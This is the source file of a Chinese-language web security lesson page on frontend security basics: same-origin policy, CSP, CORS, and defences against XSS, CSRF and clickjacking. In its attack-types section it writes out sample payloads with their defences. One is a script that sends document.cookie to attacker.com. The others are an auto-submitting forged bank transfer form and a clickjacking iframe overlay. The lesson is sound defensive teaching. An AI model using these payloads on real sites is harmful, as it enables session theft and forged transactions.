'use client'

import LessonLayout, { type LessonMeta } from '@/app/components/ui/book/LessonLayout'
import { THEMES } from '@/app/components/ui/book/theme'
import {
  PageTitle, SectionTitle, BookParagraph, BookCode, BookAlert, BookList,
} from '@/app/components/ui/book/BookContent'

const META: LessonMeta = {
  subject: '网络安全',
  chapterTitle: '前端安全基础',
  chapterNumber: 1,
  totalChapters: 10,
  subjectHref: '/study/security/frontend',
  prevChapter: { label: '密码学应用', href: '/study/security/crypto/application' },
  nextChapter: { label: 'XSS攻击防护', href: '/study/security/frontend/xss' },
  theme: THEMES.security,
}

const sameOriginCode = `// 同源示例
http://example.com/page1.html 和 http://example.com/page2.html 是同源
http://example.com 和 https://example.com 不是同源
http://example.com 和 http://api.example.com 不是同源
http://example.com:80 和 http://example.com:8080 不是同源`

const cspCode = `// CSP配置示例
Content-Security-Policy:
  default-src 'self';  // 只允许从同源加载资源
  script-src 'self' https://trusted-cdn.com;  // 允许从指定CDN加载脚本
  style-src 'self' 'unsafe-inline';  // 允许内联样式
  img-src 'self' data: https:;  // 允许从同源、data URL和HTTPS加载图片
  connect-src 'self' https://api.example.com;  // 允许向指定API发送请求`

const corsCode = `// 服务器端CORS配置示例（Node.js/Express）
app.use(cors({
  origin: 'https://trusted-site.com',  // 允许的源
  methods: ['GET', 'POST'],  // 允许的HTTP方法
  allowedHeaders: ['Content-Type', 'Authorization'],  // 允许的请求头
  credentials: true,  // 允许发送凭证
  maxAge: 86400  // 预检请求的缓存时间
}));

// 客户端跨域请求示例
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',  // 包含凭证
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'example' })
});`

const bestPracticeCode = `// 1. 输入验证
function validateInput(input) {
  // 使用正则表达式验证输入
  const pattern = /^[a-zA-Z0-9]+$/;
  return pattern.test(input);
}

// 2. 输出编码
function encodeOutput(input) {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 3. 安全的Cookie设置
document.cookie = "sessionId=123; Secure; HttpOnly; SameSite=Strict";

// 4. 安全的本地存储
// 使用加密存储敏感数据
const encryptedData = CryptoJS.AES.encrypt(
  JSON.stringify(sensitiveData),
  secretKey
).toString();
localStorage.setItem('encryptedData', encryptedData);`

const xssCode = `// 攻击示例：在评论中注入恶意脚本
const comment = '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>';

// 防御示例：使用DOMPurify库净化输入
import DOMPurify from 'dompurify';

function sanitizeInput(input) {
  return DOMPurify.sanitize(input);
}

// 使用示例
const safeComment = sanitizeInput(comment);
document.getElementById('comments').innerHTML = safeComment;`

const reflectedXssCode = `// 攻击示例：通过URL参数注入脚本
// 恶意URL: https://example.com/search?q=<script>alert('XSS')</script>

// 防御示例：使用encodeURIComponent编码URL参数
function handleSearch(query) {
  const encodedQuery = encodeURIComponent(query);
  const searchUrl = \`/api/search?q=\${encodedQuery}\`;
  // 进行搜索...
}

// 使用示例
handleSearch('<script>alert("XSS")</script>');`

const csrfCode = `// 攻击示例：伪造转账请求
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('csrf-form').submit();</script>

// 防御示例：使用CSRF Token
// 服务器端生成Token
const csrfToken = generateCSRFToken();

// 客户端发送请求时携带Token
async function makeRequest() {
  const response = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
      amount: 1000,
      to: 'recipient'
    })
  });
  // 处理响应...
}`

const clickjackingCode = `// 攻击示例：使用iframe覆盖目标网站
<style>
  .overlay {
    position: fixed; top: 0; left: 0;
    width: 100%; height: 100%; z-index: 1;
  }
  .target {
    position: absolute; top: 100px; left: 100px; z-index: 0;
  }
</style>
<div class="overlay">
  <button>点击赢取奖品！</button>
</div>
<iframe class="target" src="https://bank.com/transfer"></iframe>

// 防御示例：使用X-Frame-Options头
// 服务器端设置
res.setHeader('X-Frame-Options', 'DENY');
// 或使用Content-Security-Policy
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");`

const inputValidationCode = `// 1. 使用正则表达式验证
function validateEmail(email) {
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  return emailRegex.test(email);
}

// 2. 使用HTML转义
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 3. 使用DOMPurify库
import DOMPurify from 'dompurify';

function sanitizeHtml(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
}

// 4. 使用Content Security Policy
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self' https://trusted-cdn.com;
           style-src 'self' 'unsafe-inline';">`

const cookieCode = `// 1. 设置安全的Cookie
document.cookie = "sessionId=123; Secure; HttpOnly; SameSite=Strict";

// 2. 使用Cookie属性
const cookieOptions = {
  secure: true,      // 只通过HTTPS发送
  httpOnly: true,    // 防止JavaScript访问
  sameSite: 'Strict', // 防止CSRF攻击
  path: '/',
  domain: 'example.com',
  maxAge: 3600
};

// 3. 使用Cookie库
import Cookies from 'js-cookie';
Cookies.set('sessionId', '123', {
  secure: true,
  sameSite: 'strict'
});`

const secureApiCode = `// 1. 使用Fetch API的安全配置
async function secureFetch(url, options = {}) {
  const defaultOptions = {
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest'
    }
  };

  const response = await fetch(url, {
    ...defaultOptions,
    ...options
  });

  if (!response.ok) {
    throw new Error('Network response was not ok');
  }

  return response.json();
}

// 2. 使用Axios的安全配置
import axios from 'axios';

const api = axios.create({
  baseURL: 'https://api.example.com',
  withCredentials: true,
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  }
});

// 添加请求拦截器
api.interceptors.request.use(config => {
  const token = document.querySelector('meta[name="csrf-token"]').content;
  config.headers['X-CSRF-Token'] = token;
  return config;
});

// 添加响应拦截器
api.interceptors.response.use(
  response => response,
  error => {
    if (error.response.status === 401) {
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);`

const eslintConfigCode = `// 1. 使用ESLint安全规则
// .eslintrc.js
module.exports = {
  extends: [
    'eslint:recommended',
    'plugin:security/recommended'
  ],
  plugins: ['security'],
  rules: {
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-unsafe-regex': 'error'
  }
};

// 2. 使用安全相关的npm包
// package.json
{
  "dependencies": {
    "helmet": "^4.6.0",
    "cors": "^2.8.5",
    "express-rate-limit": "^5.3.0",
    "express-validator": "^6.12.0",
    "jsonwebtoken": "^8.5.1",
    "bcryptjs": "^2.4.3",
    "cookie-parser": "^1.4.5",
    "csurf": "^1.11.0"
  }
}`

const expressConfigCode = `// 1. Express安全配置
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import { body, validationResult } from 'express-validator';

const app = express();

// 使用Helmet设置安全头
app.use(helmet());

// 配置CORS
app.use(cors({
  origin: 'https://trusted-site.com',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// 配置请求限制
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 100
});
app.use(limiter);

// 2. 安全中间件
const securityMiddleware = (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
};

app.use(securityMiddleware);

// 3. 输入验证
app.post('/api/user', [
  body('email').isEmail(),
  body('password').isLength({ min: 8 }),
  body('name').trim().escape()
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
});`

const SPREADS = [
  {
    label: '安全概述',
    left: (
      <div className="space-y-4">
        <PageTitle>前端安全概述</PageTitle>
        <SectionTitle>1. 前端安全的重要性</SectionTitle>
        <BookParagraph>
          前端安全是Web应用安全的第一道防线。随着Web应用的复杂性增加，前端面临的安全威胁也越来越多。前端安全不仅关系到用户体验，更关系到整个应用的安全性。
        </BookParagraph>
        <SectionTitle>2. 同源策略（Same-Origin Policy）</SectionTitle>
        <BookParagraph>
          同源策略是浏览器最基本的安全机制，它限制了来自不同源的文档或脚本之间的交互。同源的定义包括：协议相同、域名相同、端口相同。
        </BookParagraph>
        <BookCode language="javascript" code={sameOriginCode} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>3. 内容安全策略（CSP）</SectionTitle>
        <BookParagraph>CSP是一个额外的安全层，用于检测和减轻某些类型的攻击，如XSS和数据注入攻击。它通过指定允许加载的资源类型和来源来实现。</BookParagraph>
        <BookCode language="javascript" code={cspCode} />
        <SectionTitle>4. 跨域资源共享（CORS）</SectionTitle>
        <BookParagraph>CORS是一种机制，允许Web应用服务器进行跨域访问控制，从而使跨域数据传输得以安全进行。</BookParagraph>
        <BookCode language="javascript" code={corsCode} />
      </div>
    ),
  },
  {
    label: '攻击类型',
    left: (
      <div className="space-y-4">
        <PageTitle>常见攻击类型</PageTitle>
        <SectionTitle>1. XSS攻击（存储型）</SectionTitle>
        <BookCode language="javascript" code={xssCode} />
        <SectionTitle>2. XSS攻击（反射型）</SectionTitle>
        <BookCode language="javascript" code={reflectedXssCode} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>3. CSRF攻击</SectionTitle>
        <BookCode language="javascript" code={csrfCode} />
        <SectionTitle>4. 点击劫持（Clickjacking）</SectionTitle>
        <BookCode language="javascript" code={clickjackingCode} />
      </div>
    ),
  },
  {
    label: '防御方案',
    left: (
      <div className="space-y-4">
        <PageTitle>防御方案</PageTitle>
        <SectionTitle>1. 输入验证和过滤</SectionTitle>
        <BookCode language="javascript" code={inputValidationCode} />
        <SectionTitle>2. 安全的Cookie设置</SectionTitle>
        <BookCode language="javascript" code={cookieCode} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>3. 安全的API调用</SectionTitle>
        <BookCode language="javascript" code={secureApiCode} />
      </div>
    ),
  },
  {
    label: '安全工具',
    left: (
      <div className="space-y-4">
        <PageTitle>安全工具</PageTitle>
        <SectionTitle>1. 安全扫描工具</SectionTitle>
        <BookList items={[
          'OWASP ZAP：Web应用安全扫描器',
          'Burp Suite：Web应用安全测试工具',
          'Acunetix：自动化Web漏洞扫描器',
          'SonarQube：代码质量与安全分析工具',
        ]} />
        <SectionTitle>2. 开发工具</SectionTitle>
        <BookCode language="javascript" code={eslintConfigCode} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>3. 监控工具</SectionTitle>
        <BookList items={[
          'Sentry：错误监控和性能监控',
          'New Relic：应用性能监控',
          'Datadog：基础设施监控',
          'LogRocket：用户会话回放',
        ]} />
        <SectionTitle>4. 安全配置示例</SectionTitle>
        <BookCode language="javascript" code={expressConfigCode} />
      </div>
    ),
  },
]

export default function FrontendSecurityBasicPage() {
  return <LessonLayout meta={META} spreads={SPREADS} />
}
